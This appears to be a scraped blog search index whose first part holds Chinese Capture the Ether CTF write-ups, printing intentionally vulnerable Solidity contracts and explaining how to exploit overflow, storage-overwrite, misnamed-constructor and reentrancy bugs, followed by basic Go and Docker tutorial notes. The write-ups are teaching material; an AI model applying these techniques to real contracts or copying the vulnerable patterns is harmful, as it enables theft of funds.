&gt; 0);        // penalty is what&#x27;s left        msg.sender.transfer(address(this).balance);    &#125;&#125;\n\n分析：要能够进行transfer操作除了own本人进行withdraw后，我们才能进行。但是因为withdrawn是一个uint256的数，我们只要往合约中投入一点ether，使得withdrawn发生溢出就能够绕过要求进行提款。攻击实现：我们看到在合约中并没有任何接受ether的方法，所以不能向合约直接发送ether，所以这里需要通过函数selfdestruct可参考Ethernaut 题8\nMapping源代码：\npragma solidity ^0.4.21;contract MappingChallenge &#123;    bool public isComplete;    uint256[] map;    function set(uint256 key, uint256 value) public &#123;        // Expand dynamic array as needed        if (map.length &lt;= key) &#123;            map.length = key + 1;        &#125;        map[key] = value;    &#125;    function get(uint256 key) public view returns (uint256) &#123;        return map[key];    &#125;&#125;\n\nDonation要求：取走合约中的钱源代码：\npragma solidity ^0.4.21;contract DonationChallenge &#123;    struct Donation &#123;        uint256 timestamp;        uint256 etherAmount;    &#125;    Donation[] public donations;    address public owner;    function DonationChallenge() public payable &#123;        require(msg.value == 1 ether);                owner = msg.sender;    &#125;        function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function donate(uint256 etherAmount) public payable &#123;        // amount is in ether, but msg.value is in wei        uint256 scale = 10**18 * 1 ether;        require(msg.value == etherAmount / scale);        Donation donation;        donation.timestamp = now;        donation.etherAmount = etherAmount;        donations.push(donation);    &#125;    function withdraw() public &#123;        require(msg.sender == owner);                msg.sender.transfer(address(this).balance);    &#125;&#125;\n分析：只有成为owner才能进行withdraw，将钱取出来。（合约中没有任何直接修改owner的方法）在donate函数中直接对结构体Donation进行了初始化，并没有使用memory关键字，于是此处的Donation存储在storage中，由合约对属性的定义顺序，owner的key值为1，恰好donation.etherAmount会将其覆盖，也就是说：我们只需要将我们的地址作为参数执行donate方法便可以更改owner。因为require(msg.value == etherAmount / scale)这一条件。我们将自己的地址进行计算一下，来得知我们需要向合约发送多少value。\n实现：\nfunction getValut(uint256 amount) public pure returns (uint2565) &#123;    return amount / 10**36;&#125;\n通过计算得出msg.value的值为979192615699在执行donate方法成功后我们再次调用owner可以看到owner已经是我们自己的地址了，接着进行withdraw就可以通关了。\nFifty years要求：等到50年后取走合约中的money源代码：\npragma solidity ^0.4.21;contract FiftyYearsChallenge &#123;    struct Contribution &#123;        uint256 amount;        uint256 unlockTimestamp;    &#125;    Contribution[] queue;    uint256 head;    address owner;    function FiftyYearsChallenge(address player) public payable &#123;        require(msg.value == 1 ether);        owner = player;        queue.push(Contribution(msg.value, now + 50 years));    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function upsert(uint256 index, uint256 timestamp) public payable &#123;        require(msg.sender == owner);        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;            // Update existing contribution amount without updating timestamp.            Contribution storage contribution = queue[index];            contribution.amount += msg.value;        &#125; else &#123;            // Append a new contribution. Require that each contribution unlock            // at least 1 day after the previous one.            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);            contribution.amount = msg.value;            contribution.unlockTimestamp = timestamp;            queue.push(contribution);        &#125;    &#125;    function withdraw(uint256 index) public &#123;        require(msg.sender == owner);        require(now &gt;= queue[index].unlockTimestamp);        // Withdraw this and any earlier contributions.        uint256 total = 0;        for (uint256 i = head; i &lt;= index; i++) &#123;            total += queue[i].amount;            // Reclaim storage.            delete queue[i];        &#125;        // Move the head of the queue forward so we don&#x27;t have to loop over        // already-withdrawn contributions.        head = index + 1;        msg.sender.transfer(total);    &#125;&#125;\n分析：第一点：如何解决50年的时间问题：这里的unlockTimestamp可以发生上溢从而归零。所以在upsert函数中通过设置timestamp=0可以将时间限制解除。于是需要对upsert进行两次调用，第一次将unlockTimeStamp设置为+1days就能发生溢出的极限值，第二次调用就可以绕过检查设置为0。根据前面几题的经验可以看到在upsert函数中contribution.amount和contribution.unlockTimestamp都造成了变量覆盖：分别将queue的长度和head的值进行了覆盖。实现：\n\n部署合约\n进行第一次upsert调用，设置为时间溢出的极限值这里应该设1wei，否则queue的length不够\n进行第二次upsert调用，设置为0\n\n第一次调用中同时改变了head的值，index大于2不是硬性要求4. 第三次进行withdraw调用\nAccounts这一部分有一些关于以太坊的密码学原理包括椭圆曲线加密，ECDSA签名算法等，他们与合约漏洞并无关系\nFuzzy identity要求：获取私钥源代码：\npragma solidity ^0.4.21;interface IName &#123;    function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123;    bool public isComplete;    function authenticate() public &#123;        require(isSmarx(msg.sender));        require(isBadCode(msg.sender));        isComplete = true;    &#125;    function isSmarx(address addr) internal view returns (bool) &#123;        return IName(addr).name() == bytes32(&quot;smarx&quot;);    &#125;    function isBadCode(address _addr) internal pure returns (bool) &#123;        bytes20 addr = bytes20(_addr);        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;        for (uint256 i = 0; i &lt; 34; i++) &#123;            if (addr &amp; mask == id) &#123;                return true;            &#125;            mask &lt;&lt;= 4;            id &lt;&lt;= 4;        &#125;        return false;    &#125;&#125;\n分析：要通过验证需要通过isSmarx()和isBadCode()的验证，因此需要一个能返回一个特殊名字smarx的合约以及合约地址包含十六进制字符串badc0de。因此，这个挑战就是要暴力破解大量合约，直到你最终获得一个包含目标字符串的合约地址\n\ntips：十六进制字面常数十六进制字面常数以关键字 hex 打头，后面紧跟着用单引号或双引号引起来的字符串（例如，hex”001122FF”）。 字符串的内容必须是一个十六进制的字符串，它们的值将使用二进制表示。它们可以隐式地转换成 bytes1，……，bytes32，如果合适的话，还可以转换成 bytes 以及 string。\n\nPublic Key要求：账户的公钥源代码：\npragma solidity ^0.4.21;contract PublicKeyChallenge &#123;    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;    bool public isComplete;    function authenticate(bytes publicKey) public &#123;        require(address(keccak256(publicKey)) == owner);        isComplete = true;    &#125;&#125;\n我们都知道以太坊的地址与比特币的一样由公钥计算而来。在用户进行交易时往往需要进行签名，而这个签名中就含有公钥（供其他人验证交易来自于该账户），\nAccount Takeover要求：成为owner源代码：\npragma solidity ^0.4.21;contract AccountTakeoverChallenge &#123;    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;    bool public isComplete;    function authenticate() public &#123;        require(msg.sender == owner);        isComplete = true;    &#125;&#125;\n\nMiscellaneousAssume ownership要求：成为owner源代码：  \npragma solidity ^0.4.21;contract AssumeOwnershipChallenge &#123;    address owner;    bool public isComplete;    function AssumeOwmershipChallenge() public &#123;        owner = msg.sender;    &#125;    function authenticate() public &#123;        require(msg.sender == owner);        isComplete = true;    &#125;&#125;\n分析：构造函数的错误使其变成了一个公共的方法，使得任何人都可以直接使用来声明所有权。\nToken bank要求：获取Token合约中的余额源代码：\npragma solidity ^0.4.21;interface ITokenReceiver &#123;    function tokenFallback(address from, uint256 value, bytes data) external;&#125;contract SimpleERC223Token &#123;    // Track how many tokens are owned by each address.    mapping (address =&gt; uint256) public balanceOf;    string public name = &quot;Simple ERC223 Token&quot;;    string public symbol = &quot;SET&quot;;    uint8 public decimals = 18;    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);    event Transfer(address indexed from, address indexed to, uint256 value);    function SimpleERC223Token() public &#123;        balanceOf[msg.sender] = totalSupply;        emit Transfer(address(0), msg.sender, totalSupply);    &#125;    function isContract(address _addr) private view returns (bool is_contract) &#123;        uint length;        assembly &#123;            //retrieve the size of the code on target address, this needs assembly            length := extcodesize(_addr)        &#125;        return length &gt; 0;    &#125;    function transfer(address to, uint256 value) public returns (bool success) &#123;        bytes memory empty;        return transfer(to, value, empty);    &#125;    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;        require(balanceOf[msg.sender] &gt;= value);        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);        if (isContract(to)) &#123;            ITokenReceiver(to).tokenFallback(msg.sender, value, data);        &#125;        return true;    &#125;    event Approval(address indexed owner, address indexed spender, uint256 value);    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;    function approve(address spender, uint256 value)        public        returns (bool success)    &#123;        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);        return true;    &#125;    function transferFrom(address from, address to, uint256 value)        public        returns (bool success)    &#123;        require(value &lt;= balanceOf[from]);        require(value &lt;= allowance[from][msg.sender]);        balanceOf[from] -= value;        balanceOf[to] += value;        allowance[from][msg.sender] -= value;        emit Transfer(from, to, value);        return true;    &#125;&#125;contract TokenBankChallenge &#123;    SimpleERC223Token public token;    mapping(address =&gt; uint256) public balanceOf;    function TokenBankChallenge(address player) public &#123;        token = new SimpleERC223Token();        // Divide up the 1,000,000 tokens, which are all initially assigned to        // the token contract&#x27;s creator (this contract).        balanceOf[msg.sender] = 500000 * 10**18;  // half for me        balanceOf[player] = 500000 * 10**18;      // half for you    &#125;    function isComplete() public view returns (bool) &#123;        return token.balanceOf(this) == 0;    &#125;    function tokenFallback(address from, uint256 value, bytes) public &#123;        require(msg.sender == address(token));        require(balanceOf[from] + value &gt;= balanceOf[from]);        balanceOf[from] += value;    &#125;    function withdraw(uint256 amount) public &#123;        require(balanceOf[msg.sender] &gt;= amount);        require(token.transfer(msg.sender, amount));        balanceOf[msg.sender] -= amount;    &#125;&#125;\n分析：合约自定义了ERC-233标准，（ERC-233与ERC-20的不同之处在于如果接收人的地址是一个合约将会通过tokenFallback方法来通知接收方转移。在Token合约创建的时候，就有一百万的token余额，其中50万给了创建者，50万给了玩家。所以需要获取更多的token来完成挑战。可以看到如果我们通过攻击合约利用Token合约向Bank转账时，会触发isContract执行Bank合约中的tokenFallback从而增加Bank中的余额，之后我们再通过withdraw向Bank取款就行了。  \n\n同时在withdraw函数中合约先向我们转账再减我们的余额，这使得我们可以重复地提取我们的余额，重入的过程将会是：challenge.withdraw() -&gt; token.transfer() -&gt; msg.sender.tokenFallback() -&gt; ... 直到余额为0。\n\n实现：先部署攻击合约，再将攻击合约作为player部署Bank接着直接调用CallWithdraw（执行成功后，可以在交易日志中看到进行了两次transfer调用。进入tokenFallback后又调用了一次）\n","categories":["靶场"],"tags":["题解","Remix","CapturetheEther"]},{"title":"web3.js","url":"/2023/04/11/web3-js/","content":""},{"title":"Golang","url":"/2023/04/28/Golang/","content":"GO语言特色\n简洁、快速、安全\n并行、开源\n编译迅速、内存管理\n\nGO用途","categories":["Golang"],"tags":["教程"]},{"title":"Go环境安装","url":"/2023/05/05/go_env/","content":"环境安装\n下载二进制包\nLinux\n\nMac\n\nWindows\n\n\n\n安装\n添加PATH变量\n添加\n安装测试\n\n在一个文件夹中新建test.go文件，\npackage mainimport &quot;fmt&quot;func main() &#123;   fmt.Println(&quot;Hello, World!&quot;)&#125;\n通过go命令执行以上代码输出结果如下：go run test.go\n还可以通过go build命令生成二进制文件\n","categories":["Golang"]},{"title":"Go基础语法","url":"/2023/05/05/go-BasicGrammer/","content":"Go语言基础语法go标记Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。fmt.Println(&quot;Hello,Go!!&quot;)这一个语句就由6个标记组成：\n\nfmt\n.\nPrintln\n(\n“Hello,Go!!”\n)\n\n行分隔符GO程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号1;结尾，因为这些工作都将由 Go 编译器自动完成。\n\n如果你打算将多个语句写在同一行，它们则必须使用;人为区分，但在实际开发中我们并不鼓励这种做法。\n\n注释注释不会被编译，每一个包应该有相关注释。\n单行注释是最常见的注释形式，你可以在任何地方使用以 &#x2F;&#x2F; 开头的单行注释。\n多行注释也叫块注释，均已以 &#x2F;* 开头，并以 *&#x2F; 结尾。如：\n// 单行注释/* 我是多行注释 */\n标识符用来命名变量、类型等程序实体。\n第一个字符必须是字母或下划线而不能是数字。且不包括关键字、不包含运算符\n关键字break\tdefault\tfunc\tinterface\tselectcase\tdefer\tgo\tmap\tstructchan\telse\tgoto\tpackage\tswitchconst\tfallthrough\tif\trange\ttypecontinue\tfor\timport\treturn\tvar\n预定义标识符：append\tbool\tbyte\tcap\tclose\tcomplex\tcomplex64\tcomplex128\tuint16copy\tfalse\tfloat32\tfloat64\timag\tint\tint8\tint16\tuint32int32\tint64\tiota\tlen\tmake\tnew\tnil\tpanic\tuint64print\tprintln\treal\trecover\tstring\ttrue\tuint\tuint8\tuintptr\n空格的使用空格通常用于分隔标识符、关键字、运算符和表达式，以提高代码的可读性。\n\nGo语言中变量的声明必须使用空格隔开\n在关键字和表达式之间要使用空格\n在函数调用时，函数名和左边等号之间要使用空格，参数之间也要使用空格\n在运算符和操作数之间要使用空格能让程序更易阅读\n在变量与运算符间加入空格，程序看起来更加美观\n\n格式化字符串使用fmt.Sprintf或fmt.Printf格式化字符串并赋值给新串\nfmt.Sprintf根据格式化参数生成格式化的字符串并返回该字符串\nfmt.Sprintf(格式化样式, 参数列表...)\n\n格式化样式：字符串形式、格式化符号%\n参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。\n\nGo 字符串格式化符号:  \n\n\n\n格式\n描述\n\n\n\n%v\n按值的本来值输出\n\n\n%+v\n在 %v 基础上，对结构体字段名和值进行展开\n\n\n%#v\n输出 Go 语言语法格式的值\n\n\n%T\n输出 Go 语言语法格式的类型和值\n\n\n%%\n输出 % 本体\n\n\n%b\n整型以二进制方式显示\n\n\n%o\n整型以八进制方式显示\n\n\n%d\n整型以十进制方式显示\n\n\n%x\n整型以十六进制方式显示\n\n\n%X\n整型以十六进制方式显示，字母大写\n\n\n%U\nUnicode 字符\n\n\n%f\n浮点数\n\n\n%p\n指针，十六进制方式显示\n\n\nExample：\npackage mainimport (    &quot;fmt&quot;    &quot;io&quot;    &quot;os&quot;)func main() &#123;    // 声明数字变量    const num1, num2, num3 = 5, 10, 15     // 调用 Sprintf() 函数    s := fmt.Sprintf(&quot;%d + %d = %d&quot;, num1, num2, num3)     // 使用 WriteString() 函数将结果输出到终端 to write the    //  &quot;os.Stdout&quot; 为字符串的内容    io.WriteString(os.Stdout, s) &#125;\nfmt.Printf根据格式化参数生成格式化的字符串并写入标准输出。与fmt.Sprintf格式类似，但fmt.Printf直接输出，更方便调试字符串连接：通过+实现：\n","categories":["Golang"]},{"title":"数据类型","url":"/2023/05/07/go-dataStructure/","content":"数据类型数据类型的出现是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候才需要申请大内存，就可以充分利用内存。\n布尔型\n常量true\n常量false\n\n数字类型整型有8位，16位，32位，64位\n\nint：有符号\nuint：无符号\n\n浮点型\nfloat32：32位浮点型数\nfloat64：64位浮点型数\n\n复数\ncomplex64：32位实数和虚数\ncomplex128：64位实数和虚数\n\n\nbyte:类似uint8rune:类似int32uintptr:无符号整型，用于存放一个指针\n\n字符串类型Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。\n\n派生类型指针、数组、结构体、channel、函数、切片、接口、Map\n\n","categories":["Golang"]},{"title":"docker","url":"/2023/07/18/docker/","content":"docker简介解决应用在不同开发环境上的环境配置的麻烦————docker：系统平滑移植，容器虚拟化技术\nDocker可以将软件的原生环境复制过来，消除了协作编码时 “我的机器上可以正常工作” 的问题\n概念Docker是基于GO的云开源项目，解决运行环境和配置问题的软件容器，方便做持续集成、整体发布的容器虚拟化技术。\ndocker特点“Build， Ship and Run Any App， Anywhere”\n通过对应用的封装、发布、部署、运行等生命周期的管理，使其能够做到“一次镜像，处处运行”\n\n安全可靠  容器间的隔离不仅限于彼此，还独立于底层的基础设施。当应用出现问题时，不会波及到主机\n\n资源利用率高  容器拥有很高的兼容性，能够将应用直接迁移到另一个平台，提高了开发效率，减少了部署应用的工作量\n\n标准开放  容器基于开放式标准，能够在任何基础设施上运行。运输方式、存储方式、API接口隔离\n\n轻量化  容器的构建快速且使用更少的计算和内存，\n\n\n架构与主要功能组件docker整体采用C&#x2F;S模式，客户端主要负责发送操作指令，服务端负责接受和处理指令。客户端和服务端之间的通信方式多样\n功能组件\nDocker客户端  Docker客户端一般通过Docker command来发起请求\nDocker服务器（Docker daemon）  接受客户端发来的请求，并实现所要求的的功能，同时针对请求返回相应的结果。\nDocker容器\nDocker镜像  镜像是一个只读的模板，用来创建相应的容器。\nDocker仓库  仓库是存放镜像的地方，类似于Maven，GitHub。docker提供的官方registry————Docker Hub。仓库可分为公开仓库和私有仓库\n\n与传统虚拟机的对比虚拟机（virtual machine），可以在一种操作系统里运行另一种操作系统。\n传统虚拟机技术是通过在主操作系统上的虚拟管理系统（VMware、virtualBox）创建虚拟机（模拟各种硬件），安装操作系统，安装部署各种应用\n\n特点\n资源占用多\n冗余步骤多\n启动慢\n\n\n\nLinux容器（Linux Containers，LXC）是与系统其他部分隔离开的一系列进程，容器不是模拟一个完整的操作系统而是对进程进行隔离，将软件运行所需的所有资源打包到一个隔离的容器中，因此在开发到测试再到生产的过程中，他都具有可移植性和一致性。容器虚拟化技术不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置，整个过程更轻量，高效并保证在任何环境中能够运行\n总结：容器是在操作系统层面上实现虚拟化，容器之间共享主机的操作系统，容器作为进程在主机上运行；而虚拟机是在硬件层面上实现虚拟化，有自己的操作系统且独立于主机操作系统。\n安装Cgroup对进程资源进行限制，对资源的使用进行追踪。\n容器容器是镜像的运行实例，就如同Java语言中类与对象的关系。\n容器是一个轻量级的沙箱子，可以被启动、开始、停止、删除，每个容器之间相互隔离，保证了平台的安全。\ndocker常用指令容器生命周期管理\ndocker run\n  创建一个新的容器（并运行一个命令）\n  docker run [OPTIONS] IMAGE [COMMAND]\n  常见参数：\n\n-d：后台运行容器，将返回容器ID\n-i：以交互模式运行容器，常与-i一起使用\n-P：随机端口映射，容器内部端口随机映射到主机的端口\n-p：指定端口映射，格式主机端口:容器端口\n-t：为容器分配一个伪输入终端\n–name：为容器指定一个名称\n–net：指定容器的网络连接类型\n–link：连接到另一个容器\n–volume：绑定一个卷\n\n\ndocker start&#x2F;stop&#x2F;restart\n  start：启动一个或多个已被停止的容器\n  stop：停止一个正在运行的容器\n  restart：重启容器\n\ndocker kill\n  杀掉一个运行中的容器\n\ndocker rm\n  删除一个或多个容器\n\ndocker exec\n\n\n容器操作\ndocker ps\n\ndocker inspect\n  获取容器&#x2F;镜像的元数据。\n\ndocker attach\n\ndocker\n\n\n本地镜像管理\ndocker image tag\n\ndocker image build \n  根据Dockerfile文件构建新镜像，其中还有些常见的选项，简写为docker build\n\n-t，生成镜像的名字及标签，可以在一次构建中为一个镜像设置多个标签\n-f，指定使用的Dockerfile文件\n\n\ndocker image history\n  可以查看指定镜像的创建历史\n\ndocker image save\n\ndocker image load\n\n\n容器rootfs命令\ndocker commit\ndocker cp\n\n镜像仓库\ndocker login&#x2F;logout\ndocker pull\ndocker push\ndocker search\n\ninfo|version\ndocekr info\ndocker version\n\n"},{"title":"go_argument","url":"/2023/07/25/go-argument/","content":""}]